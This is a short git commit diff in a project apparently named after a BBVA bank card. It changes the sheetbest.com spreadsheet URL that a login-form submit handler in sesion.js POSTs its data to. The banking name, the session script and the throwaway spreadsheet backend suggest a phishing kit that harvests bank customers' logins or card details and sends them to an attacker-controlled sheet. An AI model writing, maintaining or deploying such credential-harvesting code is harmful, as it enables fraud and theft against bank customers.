f92509cb0ba85a04edf7a16f0d452bcb617177f5
25a-mx <robledofrancis4@gmail.com>
2026-08-25 09:18:22 -0600

    Update API endpoint in sesion.js

--- bbva-tarjeta/js/sesion.js
+++ bbva-tarjeta/js/sesion.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/2d6eb5e7-fbbc-4015-b4b2-f56b6eb00165', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/187d1f7d-8403-49c7-864e-a756b7580eff', {
         method: 'POST',
         mode: 'cors',
         headers: {
